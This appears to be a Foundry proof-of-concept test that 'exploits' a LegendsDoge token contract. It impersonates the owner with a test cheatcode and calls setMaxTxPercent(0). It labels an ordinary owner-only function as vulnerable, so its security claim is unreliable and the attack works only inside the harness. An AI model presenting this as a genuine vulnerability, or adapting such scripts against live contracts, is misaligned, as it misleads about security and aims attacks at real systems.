pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ILegendsDoge {
    function owner() external view returns (address);
    function _maxTxAmount() external view returns (uint256);
    function setMaxTxPercent(uint256 maxTxPercent) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xCd092F1f9858204d7986b3a2e36730fF1229a2e5;
    address attacker = address(this);
    ILegendsDoge target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = ILegendsDoge(TARGET);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Find the owner of the contract
                address contractOwner = target.owner();

                // Step 2: Impersonate the owner
                vm.startPrank(contractOwner);

                // Step 3: Call the vulnerable function to set _maxTxAmount to 0
                target.setMaxTxPercent(0);

                // Step 4: Stop impersonating
                vm.stopPrank();

                // Oracle Check: Verify that _maxTxAmount has been set to 0
                assertEq(target._maxTxAmount(), 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
